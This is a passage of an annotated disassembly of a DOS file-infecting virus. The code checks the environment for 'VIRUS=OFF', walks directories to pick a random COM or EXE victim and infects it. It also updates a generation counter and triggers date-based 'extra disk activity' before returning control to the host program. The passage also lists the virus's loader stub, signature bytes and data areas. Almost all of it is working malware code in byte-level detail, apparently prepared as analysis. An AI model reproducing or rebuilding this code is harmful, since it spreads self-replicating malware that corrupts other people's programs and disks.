0656 BE7508        MOV     SI,0875     ; string VIRUS=OFF
0659 B90A00        MOV     CX,000A     ; size
065C 90            NOP
065D F3            REPZ
065E A6            CMPSB               ; compare strings
065F 7413          JZ      0674        ; founded!

0661 26            ES:
0662 803D00        CMP     BYTE PTR [DI],00 ; end of string marker
0665 7403          JZ      066A        ; yes

0667 47            INC     DI          ; look for end of string
0668 EBF7          JMP     0661

066A 47            INC     DI          ; point at next string
066B 26            ES:
066C 803D00        CMP     BYTE PTR [DI],00 ; end of enviroment?
066F 75E5          JNZ     0656        ; no

0671 F8            CLC                 ; string not found
0672 EB01          JMP     0675

0674 F9            STC                 ; string founded

0675 07            POP     ES
0676 5E            POP     SI
0677 5F            POP     DI
0678 59            POP     CX
0679 C3            RET

;========================
; main virus entry point

067A A3AE08        MOV     [08AE],AX  ; AX
067D 891EB608      MOV     [08B6],BX  ; carrier type (COM/EXE)
0681 890EB208      MOV     [08B2],CX  ; DS
0685 8916B008      MOV     [08B0],DX  ; CS
0689 893EB408      MOV     [08B4],DI  ; top of private stack

068D E8B7FF        CALL    0647      ; search enviroment for string VIRUS=OFF 
0690 7303          JAE     0695      ; not found

0692 E9E900        JMP     077E      ; founded, start carrier

0695 E84BFE        CALL    04E3      ; get generation number and 0004 info
0698 3D0000        CMP     AX,0000   ; 0004 info ??
069B 7403          JZ      06A0

069D E9CB00        JMP     076B      ; check disk and start carrier

06A0 E811FA        CALL    00B4      ; get DOS version
06A3 3C02          CMP     AL,02     ; 2.x
06A5 750E          JNZ     06B5

06A7 B80500        MOV     AX,0005
06AA E8ACF9        CALL    0059      ; get random number less than AX
06AD 3D0100        CMP     AX,0001
06B0 7403          JZ      06B5

06B2 E9B600        JMP     076B      ; check disk and start carrier

06B5 B41A          MOV     AH,1A     ; set DTA
06B7 BA2609        MOV     DX,0926   ; buffer
06BA CD21          INT     21

06BC C606BA0800    MOV     BYTE PTR [08BA],00  ; mark empty buffer
06C1 90            NOP

06C2 BFBA08        MOV     DI,08BA   ; file name buffer
06C5 B92003        MOV     CX,0320   ; length 
06C8 32C0          XOR     AL,AL
06CA F2            REPNZ
06CB AE            SCASB
06CC 4F            DEC     DI
06CD C6055C        MOV     BYTE PTR [DI],5C     ; '\'
06D0 C645012A      MOV     BYTE PTR [DI+01],2A  ; '*'
06D4 C645022E      MOV     BYTE PTR [DI+02],2E  ; '.'
06D8 C645032A      MOV     BYTE PTR [DI+03],2A  ; '*'
06DC C6450400      MOV     BYTE PTR [DI+04],00  ; end of string marker
06E0 BB0000        MOV     BX,0000    ; counter of founded entries
06E3 BABA08        MOV     DX,08BA    ; file name
06E6 B44E          MOV     AH,4E      ; find first
06E8 B93900        MOV     CX,0039    ; attributes (skip System and Hiden)
06EB CD21          INT     21

06ED 720F          JB      06FE

06EF E885FA        CALL    0177       ; analyse DTA file name
06F2 3D0000        CMP     AX,0000    ; nothing interesting
06F5 7401          JZ      06F8       ; find next

06F7 43            INC     BX         ; increase counter

06F8 B44F          MOV     AH,4F      ; find next
06FA CD21          INT     21
06FC EBEF          JMP     06ED

06FE 0BDB          OR      BX,BX      ; is anything interesting on disk?
0700 7503          JNZ     0705

0702 EB7A          JMP     077E       ; start carrier
0704 90            NOP

0705 8BC3          MOV     AX,BX      ; counter
0707 48            DEC     AX
0708 E84EF9        CALL    0059       ; get random number less than AX
070B 40            INC     AX
070C 8BD8          MOV     BX,AX      ; store number of candidate
070E BABA08        MOV     DX,08BA    ; path for find first
0711 B44E          MOV     AH,4E      ; find first
0713 B93900        MOV     CX,0039
0716 CD21          INT     21
0718 7303          JAE     071D

071A EB62          JMP     077E       ; start carrier
071C 90            NOP

071D E857FA        CALL    0177       ; analyse DTA file name
0720 3D0000        CMP     AX,0000
0723 7415          JZ      073A

0725 4B            DEC     BX
0726 7512          JNZ     073A

0728 3D0300        CMP     AX,0003  ; subdirectory
072B 7413          JZ      0740

072D 3D0100        CMP     AX,0001  ; COM
0730 7425          JZ      0757

0732 3D0200        CMP     AX,0002  ; EXE
0735 7420          JZ      0757

0737 EB45          JMP     077E     ; start carrier
0739 90            NOP

073A B44F          MOV     AH,4F    ; find next
073C CD21          INT     21
073E EBD8          JMP     0718

; subdirectory, expand path and search again

0740 BFBA08        MOV     DI,08BA
0743 8BCF          MOV     CX,DI
0745 32C0          XOR     AL,AL
0747 F2            REPNZ
0748 AE            SCASB
0749 83EF04        SUB     DI,+04
074C BE4409        MOV     SI,0944
074F B90D00        MOV     CX,000D
0752 F3            REPZ
0753 A4            MOVSB
0754 E96BFF        JMP     06C2

; founded COM or EXE file

0757 A31E09        MOV     [091E],AX  ; file type (COM/EXE)
075A E806FB        CALL    0263       ; add file name to path
075D E83DFD        CALL    049D       ; infect file
0760 7207          JB      0769

0762 E87EFD        CALL    04E3       ; get generation number and 0004 info
0765 40            INC     AX

0766 E88AF9        CALL    00F3       ; modify 0004 in carrier file on disk
0769 EB13          JMP     077E       ; start carrier

076B B42A          MOV     AH,2A      ; get date
076D CD21          INT     21

076F 3B0E1000      CMP     CX,[0010]  ; year
0773 7209          JB      077E       ; start carrier

0775 3B161200      CMP     DX,[0012]  ; month, day
0779 7203          JB      077E       ; start carrier

077B E8DFFD        CALL    055D       ; extra disk activity

077E 1E            PUSH    DS
077F A1B208        MOV     AX,[08B2]  ; carrier DS
0782 8ED8          MOV     DS,AX
0784 BA8000        MOV     DX,0080    ; restore DTA
0787 B41A          MOV     AH,1A      ; set DTA
0789 CD21          INT     21

078B 1F            POP     DS
078C 833EB60801    CMP     WORD PTR [08B6],+01  ; COM?
0791 740B          JZ      079E

0793 833EB60802    CMP     WORD PTR [08B6],+02  ; EXE?
0798 7424          JZ      07BE

079A B44C          MOV     AH,4C      ; terminate
079C CD21          INT     21

; start carrier COM file

079E A1B008        MOV     AX,[08B0]  ; carrier CS
07A1 8EC0          MOV     ES,AX
07A3 B92300        MOV     CX,0023    ; number of bytes
07A6 90            NOP
07A7 BE2108        MOV     SI,0821    ; oryginal carrier bytes
07AA BF0001        MOV     DI,0100    ; destination
07AD F3            REPZ
07AE A4            MOVSB
07AF 8CC1          MOV     CX,ES
07B1 BA0001        MOV     DX,0100
07B4 8CC0          MOV     AX,ES
07B6 8ED0          MOV     SS,AX
07B8 8B26B408      MOV     SP,[08B4]
07BC EB1C          JMP     07DA

; start carrier EXE file

07BE 8CC8          MOV     AX,CS
07C0 2B064C08      SUB     AX,[084C]
07C4 8B0E4808      MOV     CX,[0848]
07C8 03C8          ADD     CX,AX
07CA 8ED1          MOV     SS,CX
07CC 8B264A08      MOV     SP,[084A]
07D0 8B0E4408      MOV     CX,[0844]
07D4 03C8          ADD     CX,AX
07D6 8B164608      MOV     DX,[0846]

; common code for COM and EXE

07DA 8916FA07      MOV     [07FA],DX  ; patch destination address
07DE 890EFC07      MOV     [07FC],CX
07E2 A1AE08        MOV     AX,[08AE]  ; restore registers
07E5 8B0EB208      MOV     CX,[08B2]
07E9 8ED9          MOV     DS,CX
07EB 8EC1          MOV     ES,CX
07ED 33DB          XOR     BX,BX
07EF 8BCB          MOV     CX,BX
07F1 8BD3          MOV     DX,BX
07F3 8BF3          MOV     SI,BX
07F5 8BFB          MOV     DI,BX
07F7 8BEB          MOV     BP,BX

; destination address will be patched

07F9 EA00000000    JMP     0000:0000   ; jump to aplication

;***************************************
; working area

;-------------------
; COM file loader

07FE EB14          JMP     0814
0800 1400          ; generation number
0802 0000
0804 0200
0806 0000
0808 0000
080A 0000
080C 0000
080E 39 28 46 03 03 01   ; virus signature in COM file

0814 8C C9         MOV     CX,CS    
0816 8B D1         MOV     DX,CX    
0818 81 C1 21 00   ADD     CX,0021h   ; word 081A will be modyfied by wirus
081C 51            PUSH    CX       
081D 33 C9         XOR     CX,CX    
081F 51            PUSH    CX       
0820 CB            RETF             

;-----------------------------------------
; first 35 oryginal bytes of victim (COM)
             
0821     90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
0830  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
0840  90 90 90 90

;-----------------------------
; date for EXE carrier

0844  20 00      ; carrier CS 
0846  00 00      ; carrier IP
0848  00 00      ; carrier SS
084A  00 02      ; carrier SP
084C  51 02      ; virus position in file

;---------------
; working area

084E  00        ; drive number
084F  00 00     ; buffer for IBMNETIO.SYS file

;----------------------
; some special strings

0851  4D 49 43 52 4F 53 4F 46 54 00     ; MICROSOFT.
085B  4D 41 43 48 4F 53 4F 46 54 00     ; MACHOSOFT.
0865  20                                ; drive (letter)
0866  3A 5C 49 42 4D 4E 45 54 49 4F 2E 53 59 53 00 ;  :\IBMNETIO.SYS.
0875  56 49 52 55 53 3D 4F 46 46 00     ; string  VIRUS=OFF

;------------------------------------------
; buffer for first 35 bytes of *.COM files

087F  90   
0880  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
0890  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90   ................
08A0  90 90 
08A2  00 00
08A4  B8 4A
08A6  B1 17 
08A8  2C 65 
08AA  53 16
08AC  00 00       ; ??

08AE  00 00        ; AX holder
08B0  C8 0D        ; carrier code segment (CS)
08B2  C8 0D        ; carrier data segment (DS)
08B4  DD 0D        ; top of stack
08B6  02 00        ; type of carrier 1 - EXE, 2 - COM

08B8  00 00        ; buffer for 0004 location in COM and CS:0004 in EXE

; buffer for path and file name

08BA  5C 56 43 31 30 30 30 2E 43 4F 4D 00   \VC1000.COM.
08C6  00 00 00 45 00 00 4F 4D 00 4F   0.COM....E..OM.O
08D0  4D 00 54 00 00 42 00 00-00 00 00 00 00 00 00 00   M.T..B..........
08E0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
08F0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0900  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0910  00 00 00 00 00 00 00 00-00 00 00 00 00 00

091E  01 00      ; COM/EXE flag
0920  20 00      ; attribute of victim
0922  41 15      ; date stamp of victim
0924  35 A9      ; time stamp of victim

; local DTA

0926  02 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 39 00 00 00 00 00 00 00 00 ; reserved
093B  20         ; attributes
093C  35 A9      ; time stamp
094E  41 15      ; date stamp
0940  E8 03      ; file size (low word)
0942  00 00      ; file size
0944  56 43 31 30 30 30 2E 43 4F 4D 00 00 00  ; VC1000.COM...  file name

0951  90
0952  05 00        ; file handle holder

; buffer for EXE header (1C bytes)

0954  4D 5A      ; MZ marker
0956  EF 00      ; Part Page
0958  1B 00      ; Page Count
095A  00 00      ; Relo Count
095C  20 00      ; Header Size
095E  00 00      ; MinMem
0960  FF FF      ; MaxMem
0962  51 02      ; SS
0964  DD 0D      ; SP
0966  B6 7C      ; check sum
0968  06 00      ; IP
096A  51 02      ; CS
096C  3E 00      ; TablOffs
096E  00 00      ; Overlay number

0970  00 00     ; first dector to read
0972  00 00     ; sectors counter
0974  00 00     ; bytes per sector
0976  00        ; flag, 0 - 'MICROSOFT' not founded, 1 - founded
0977  00 00     ; total number of sectors on disk

; buffer for disk sectors

0979   DB  400h DUP (0)

; private stack

0D79  53 54 41 43 4B 53 54                              STACKST
0D80  41 43 4B 53 54 41 43 4B-53 54 41 43 4B 53 54 41   ACKSTACKSTACKSTA
0D90  43 4B 53 54 41 43 4B 53-54 2C 09 1C 09 D1 03 32   CKSTACKST,...Q.2
0DA0  08 00 00 58 02 6C 15 F0-03 05 00 00 00 00 00 23   ...X.l.p.......#
0DB0  40 05 00 DF 0D 00 00 0F-08 32 08 82 08 29 10 29   @.._.....2...).)
0DC0  10 55 00 29 10 02 F2 62-03 BA 08 06 00 BA 08 01   .U.)..rb.:...:..
0DD0  00 00 01 BB 0A 00 00 2F-00 AC 2F 63 12 00 00

